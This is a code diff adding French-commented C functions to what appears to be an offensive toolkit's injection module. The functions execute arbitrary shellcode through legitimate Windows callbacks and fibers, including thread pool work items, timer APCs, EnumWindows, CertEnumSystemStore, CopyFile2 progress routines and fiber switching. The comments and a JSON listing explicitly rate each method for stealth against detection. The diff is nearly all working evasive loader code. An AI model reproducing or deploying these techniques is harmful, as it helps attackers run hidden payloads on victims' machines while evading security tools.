@@ -1449,3 +1449,397 @@ BOOL Injection_ListThreads(DWORD targetPid, char** outJson) {
     *outJson = json;
     return TRUE;
 }
+
+/* =========================================================================
+ * Callback-based Execution
+ * Exécute du code via des callbacks Windows légitimes
+ * Plus discret car utilise des mécanismes système normaux
+ * ========================================================================= */
+
+/*
+ * Exécution via Thread Pool (TpAllocWork)
+ * Le shellcode est exécuté par le thread pool system
+ */
+typedef NTSTATUS (NTAPI *pTpAllocWork)(PTP_WORK* WorkReturn, PTP_WORK_CALLBACK Callback,
+                                       PVOID Context, PTP_CALLBACK_ENVIRON CallbackEnviron);
+typedef VOID (NTAPI *pTpPostWork)(PTP_WORK Work);
+typedef VOID (NTAPI *pTpReleaseWork)(PTP_WORK Work);
+
+BOOL Injection_ThreadPoolCallback(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    /* Alloue la mémoire executable pour le shellcode */
+    PVOID execMem = VirtualAlloc(NULL, shellcodeSize, 
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) return FALSE;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    /* Protège en execute-read */
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    /* Résout les fonctions du thread pool */
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pTpAllocWork TpAllocWork = (pTpAllocWork)GetProcAddress(hNtdll, "TpAllocWork");
+    pTpPostWork TpPostWork = (pTpPostWork)GetProcAddress(hNtdll, "TpPostWork");
+    pTpReleaseWork TpReleaseWork = (pTpReleaseWork)GetProcAddress(hNtdll, "TpReleaseWork");
+    
+    if (!TpAllocWork || !TpPostWork || !TpReleaseWork) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* Crée le work item */
+    PTP_WORK work = NULL;
+    NTSTATUS status = TpAllocWork(&work, (PTP_WORK_CALLBACK)execMem, NULL, NULL);
+    
+    if (status != 0 || !work) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* Poste le travail - le shellcode sera exécuté */
+    TpPostWork(work);
+    
+    /* Attend un peu que le travail soit exécuté */
+    Sleep(100);
+    
+    TpReleaseWork(work);
+    
+    /* Note: on ne libère pas execMem car le travail peut encore être en cours */
+    return TRUE;
+}
+
+/*
+ * Exécution via Timer Callback
+ * Le shellcode est exécuté quand le timer expire
+ */
+typedef NTSTATUS (NTAPI *pNtCreateTimer)(PHANDLE TimerHandle, ACCESS_MASK DesiredAccess,
+                                         POBJECT_ATTRIBUTES ObjectAttributes, DWORD TimerType);
+typedef NTSTATUS (NTAPI *pNtSetTimer)(HANDLE TimerHandle, PLARGE_INTEGER DueTime,
+                                      PTIMER_APC_ROUTINE TimerApcRoutine, PVOID TimerContext,
+                                      BOOLEAN ResumeTimer, LONG Period, PBOOLEAN PreviousState);
+
+BOOL Injection_TimerCallback(BYTE* shellcode, DWORD shellcodeSize, DWORD delayMs) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    PVOID execMem = VirtualAlloc(NULL, shellcodeSize,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) return FALSE;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    /* Crée un timer waitable */
+    HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
+    if (!hTimer) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* Configure le timer pour exécuter notre callback */
+    LARGE_INTEGER dueTime;
+    dueTime.QuadPart = -(LONGLONG)(delayMs * 10000); /* Négatif = relatif, en 100ns */
+    
+    /* SetWaitableTimer avec APC callback */
+    if (!SetWaitableTimer(hTimer, &dueTime, 0, (PTIMERAPCROUTINE)execMem, NULL, FALSE)) {
+        CloseHandle(hTimer);
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* Met le thread en état alertable pour que l'APC soit exécuté */
+    SleepEx(delayMs + 100, TRUE);
+    
+    CloseHandle(hTimer);
+    return TRUE;
+}
+
+/*
+ * Exécution via EnumWindows callback
+ * Le callback est appelé pour chaque fenêtre
+ */
+BOOL Injection_EnumWindowsCallback(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    PVOID execMem = VirtualAlloc(NULL, shellcodeSize,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) return FALSE;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    /* EnumWindows appelle le callback pour chaque fenêtre
+     * Le shellcode doit retourner FALSE pour arrêter l'énumération
+     * ou être conçu pour s'exécuter une seule fois */
+    EnumWindows((WNDENUMPROC)execMem, 0);
+    
+    VirtualFree(execMem, 0, MEM_RELEASE);
+    return TRUE;
+}
+
+/*
+ * Exécution via CertEnumSystemStore callback
+ * Utilise une API crypto pour exécuter du code
+ */
+typedef BOOL (WINAPI *pCertEnumSystemStore)(DWORD dwFlags, void* pvSystemStoreLocationPara,
+                                            void* pvArg, PFN_CERT_ENUM_SYSTEM_STORE pfnEnum);
+
+BOOL Injection_CertEnumCallback(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    PVOID execMem = VirtualAlloc(NULL, shellcodeSize,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) return FALSE;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    HMODULE hCrypt32 = LoadLibraryA("crypt32.dll");
+    if (!hCrypt32) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    pCertEnumSystemStore CertEnumSystemStore = 
+        (pCertEnumSystemStore)GetProcAddress(hCrypt32, "CertEnumSystemStore");
+    
+    if (!CertEnumSystemStore) {
+        FreeLibrary(hCrypt32);
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* CERT_SYSTEM_STORE_CURRENT_USER = 0x00010000 */
+    CertEnumSystemStore(0x00010000, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)execMem);
+    
+    FreeLibrary(hCrypt32);
+    VirtualFree(execMem, 0, MEM_RELEASE);
+    return TRUE;
+}
+
+/*
+ * Exécution via CopyFile2 progress callback
+ * Technique peu connue utilisant les callbacks de copie de fichier
+ */
+BOOL Injection_CopyFileCallback(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    PVOID execMem = VirtualAlloc(NULL, shellcodeSize,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) return FALSE;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    /* Prépare les paramètres pour CopyFile2 */
+    COPYFILE2_EXTENDED_PARAMETERS params = {0};
+    params.dwSize = sizeof(params);
+    params.dwCopyFlags = 0;
+    params.pfCancel = FALSE;
+    params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)execMem;
+    params.pvCallbackContext = NULL;
+    
+    /* Copie un fichier système (qui existe toujours) vers un fichier temp */
+    WCHAR tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    wcscat(tempPath, L"callback_test.tmp");
+    
+    /* Le callback sera appelé pendant la copie */
+    CopyFile2(L"C:\\Windows\\System32\\kernel32.dll", tempPath, &params);
+    
+    /* Supprime le fichier temp */
+    DeleteFileW(tempPath);
+    
+    VirtualFree(execMem, 0, MEM_RELEASE);
+    return TRUE;
+}
+
+/* =========================================================================
+ * Fiber-based Injection
+ * Utilise les fibers Windows pour exécuter du code
+ * Les fibers sont des threads légers gérés en user-mode
+ * ========================================================================= */
+
+/*
+ * Exécution via Fiber local
+ * Convertit le thread en fiber, crée un fiber pour le shellcode
+ */
+BOOL Injection_FiberLocal(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    PVOID execMem = VirtualAlloc(NULL, shellcodeSize,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) return FALSE;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    /* Convertit le thread courant en fiber */
+    PVOID mainFiber = ConvertThreadToFiber(NULL);
+    if (!mainFiber) {
+        /* Peut-être déjà un fiber */
+        mainFiber = GetCurrentFiber();
+        if (!mainFiber) {
+            VirtualFree(execMem, 0, MEM_RELEASE);
+            return FALSE;
+        }
+    }
+    
+    /* Crée un fiber pour exécuter le shellcode */
+    PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
+    if (!shellcodeFiber) {
+        ConvertFiberToThread();
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* Bascule vers le fiber du shellcode */
+    SwitchToFiber(shellcodeFiber);
+    
+    /* Le shellcode doit appeler SwitchToFiber(mainFiber) pour revenir ici */
+    /* Ou on attend qu'il termine */
+    
+    /* Cleanup */
+    DeleteFiber(shellcodeFiber);
+    ConvertFiberToThread();
+    VirtualFree(execMem, 0, MEM_RELEASE);
+    
+    return TRUE;
+}
+
+/*
+ * Structure pour passer le contexte au fiber
+ */
+typedef struct _FIBER_CONTEXT {
+    PVOID Shellcode;
+    DWORD Size;
+    PVOID MainFiber;
+    BOOL Executed;
+} FIBER_CONTEXT, *PFIBER_CONTEXT;
+
+/*
+ * Routine du fiber wrapper
+ * Exécute le shellcode puis retourne au fiber principal
+ */
+static VOID CALLBACK FiberWrapperRoutine(PVOID lpParameter) {
+    PFIBER_CONTEXT ctx = (PFIBER_CONTEXT)lpParameter;
+    
+    if (ctx && ctx->Shellcode) {
+        /* Cast et appelle le shellcode */
+        ((void(*)(void))ctx->Shellcode)();
+        ctx->Executed = TRUE;
+    }
+    
+    /* Retourne au fiber principal */
+    if (ctx && ctx->MainFiber) {
+        SwitchToFiber(ctx->MainFiber);
+    }
+}
+
+/*
+ * Fiber injection avec wrapper sécurisé
+ * Gère proprement le retour au thread principal
+ */
+BOOL Injection_FiberSafe(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    PVOID execMem = VirtualAlloc(NULL, shellcodeSize,
+                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!execMem) return FALSE;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    /* Prépare le contexte */
+    FIBER_CONTEXT ctx = {0};
+    ctx.Shellcode = execMem;
+    ctx.Size = shellcodeSize;
+    ctx.Executed = FALSE;
+    
+    /* Convertit en fiber */
+    ctx.MainFiber = ConvertThreadToFiber(NULL);
+    if (!ctx.MainFiber) {
+        ctx.MainFiber = GetCurrentFiber();
+    }
+    
+    if (!ctx.MainFiber) {
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* Crée le fiber wrapper */
+    PVOID wrapperFiber = CreateFiber(0, FiberWrapperRoutine, &ctx);
+    if (!wrapperFiber) {
+        ConvertFiberToThread();
+        VirtualFree(execMem, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    /* Exécute */
+    SwitchToFiber(wrapperFiber);
+    
+    /* De retour ici après que le shellcode ait terminé */
+    DeleteFiber(wrapperFiber);
+    ConvertFiberToThread();
+    VirtualFree(execMem, 0, MEM_RELEASE);
+    
+    return ctx.Executed;
+}
+
+/*
+ * Injection via UMS (User-Mode Scheduling) - Windows 7+
+ * Alternative aux fibers pour l'exécution user-mode
+ */
+typedef BOOL (WINAPI *pCreateUmsCompletionList)(PUMS_COMPLETION_LIST* UmsCompletionList);
+typedef BOOL (WINAPI *pCreateUmsThreadContext)(PUMS_CONTEXT* lpUmsThread);
+typedef BOOL (WINAPI *pEnterUmsSchedulingMode)(PUMS_SCHEDULER_STARTUP_INFO SchedulerStartupInfo);
+
+BOOL Injection_UmsThread(BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    /* UMS est complexe et nécessite plus de setup */
+    /* Pour l'instant, on utilise la méthode fiber qui est plus simple */
+    
+    return Injection_FiberSafe(shellcode, shellcodeSize);
+}
+
+/*
+ * Liste les méthodes de callback disponibles
+ */
+BOOL Injection_ListCallbackMethods(char** outJson) {
+    if (!outJson) return FALSE;
+    
+    char* json = (char*)malloc(2048);
+    if (!json) return FALSE;
+    
+    snprintf(json, 2048,
+        "{\n"
+        "  \"callback_methods\": [\n"
+        "    {\"name\": \"ThreadPool\", \"function\": \"Injection_ThreadPoolCallback\", \"stealth\": \"high\"},\n"
+        "    {\"name\": \"Timer\", \"function\": \"Injection_TimerCallback\", \"stealth\": \"high\"},\n"
+        "    {\"name\": \"EnumWindows\", \"function\": \"Injection_EnumWindowsCallback\", \"stealth\": \"medium\"},\n"
+        "    {\"name\": \"CertEnum\", \"function\": \"Injection_CertEnumCallback\", \"stealth\": \"high\"},\n"
+        "    {\"name\": \"CopyFile2\", \"function\": \"Injection_CopyFileCallback\", \"stealth\": \"high\"},\n"
+        "    {\"name\": \"FiberLocal\", \"function\": \"Injection_FiberLocal\", \"stealth\": \"medium\"},\n"
+        "    {\"name\": \"FiberSafe\", \"function\": \"Injection_FiberSafe\", \"stealth\": \"medium\"}\n"
+        "  ]\n"
+        "}"
+    );
+    
+    *outJson = json;
+    return TRUE;
+}
